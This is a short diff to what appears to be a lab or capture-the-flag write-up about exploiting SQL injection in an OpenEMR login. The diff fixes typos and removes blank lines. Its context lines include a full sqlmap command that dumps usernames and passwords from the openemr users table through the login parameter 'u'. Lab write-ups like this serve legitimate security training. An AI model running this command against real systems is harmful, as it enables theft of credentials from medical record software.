@@ -217,7 +217,7 @@ This version is vulnerable to SQL Injection: `https://www.exploit-db.com/exploit
 ## SQL Injection
 
 I captured a login request with Burp.\
-The URL parameter `u` hodlds the username.
+The URL parameter `u` holds the username.
 ```
 $ cat login.req 
 
@@ -447,8 +447,6 @@ Database: openemr
 
 Columns for table `users` acquired:
 ```
-
-
 .
 ..
 ...
@@ -517,7 +515,7 @@ Table: users
 .
 ```
 
-2 Users crendentials acquired:
+2 user crendentials acquired:
 ```
 $ sqlmap -r login.req -p u --batch -D openemr -T users -C id,fname,mname,lname,username,password --dump
 
